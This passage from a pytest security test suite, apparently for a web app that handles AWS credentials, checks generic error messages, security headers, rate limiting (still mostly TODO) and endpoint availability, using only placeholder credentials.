                "session_token": "fake-session-token"
            }
        )
        
        # Should not reveal whether credentials exist or not
        assert response.status_code in [200, 400, 401]
        
        if response.status_code >= 400:
            error = response.json()
            # Error messages should be generic
            assert "fake-secret-key" not in str(error)
    
    def test_credential_storage_encrypted(self, test_settings):
        """Test credential storage configuration is secure"""
        # Phase 1 will implement encrypted credential storage
        # For now, verify configuration supports it
        assert hasattr(test_settings, 'SECRET_KEY')
        assert len(test_settings.SECRET_KEY) >= 32  # Minimum for secure encryption


@pytest.mark.security
@pytest.mark.headers
class TestSecurityHeaders:
    """Test security headers are properly set"""
    
    def test_security_headers_present(self, client):
        """Test essential security headers are present"""
        response = client.get("/aws")
        
        # Headers that should be present after Phase 1
        expected_headers = [
            "x-content-type-options",
            "x-frame-options", 
            "x-xss-protection",
            "strict-transport-security",  # In production with HTTPS
        ]
        
        # For now, just check response is successful
        assert response.status_code == 200
        
        # TODO: After Phase 1, uncomment:
        # for header in expected_headers:
        #     if header == "strict-transport-security" and not request.is_secure:
        #         continue  # Skip HSTS for HTTP in development
        #     assert header in response.headers
    
    def test_server_header_not_leaked(self, client):
        """Test server information is not leaked"""
        response = client.get("/api/health")
        
        # Server header should not reveal too much
        server_header = response.headers.get("server", "")
        assert "uvicorn" not in server_header.lower() or len(server_header.split()) == 1


@pytest.mark.security
@pytest.mark.rate_limiting
class TestRateLimiting:
    """Test rate limiting protection (future implementation)"""
    
    def test_api_rate_limiting_configured(self, client):
        """Test API endpoints have rate limiting"""
        # Make multiple rapid requests
        responses = []
        for _ in range(20):
            response = client.get("/api/health")
            responses.append(response)
        
        # For now, all should succeed (no rate limiting yet)
        assert all(r.status_code == 200 for r in responses)
        
        # TODO: After rate limiting implementation:
        # Check that some requests are rate limited (429 status)
    
    def test_auth_endpoint_rate_limiting(self, client):
        """Test authentication endpoints have stricter rate limiting"""
        # Attempt multiple failed authentication attempts
        responses = []
        for _ in range(10):
            response = client.post(
                "/api/auth/aws-credentials",
                json={"access_key": "fake", "secret_key": "fake"}
            )
            responses.append(response)
        
        # For now, document what should be tested
        # TODO: After implementation:
        # - Should start returning 429 after N failed attempts
        # - Should include Retry-After header


@pytest.mark.security
@pytest.mark.integration
class TestSecurityIntegration:
    """Integration tests for security measures"""
    
    def test_complete_security_flow(self, client):
        """Test complete security flow with all measures"""
        # 1. Access web page (should set secure session)
        response = client.get("/aws")
        assert response.status_code == 200
        
        # 2. Check API health (should have security headers)
        response = client.get("/api/health")
        assert response.status_code == 200
        
        # 3. Attempt credential validation (should be secure)
        response = client.post("/api/auth/aws-credentials", json={
            "access_key": "test", "secret_key": "test"
        })
        assert response.status_code in [200, 400, 401]
        
        # 4. Check feature flags (should require proper auth in future)
        response = client.get("/api/feature-flags")
        assert response.status_code == 200
    
    def test_security_regression_prevention(self, client):
        """Test that security fixes don't break existing functionality"""
        # Core functionality should still work
        endpoints = [
            "/api/health",
            "/api/providers", 
            "/api/feature-flags/health",
            "/docs",
            "/aws"
        ]
        
        for endpoint in endpoints:
            response = client.get(endpoint)
            assert response.status_code == 200, f"Endpoint {endpoint} failed with {response.status_code}"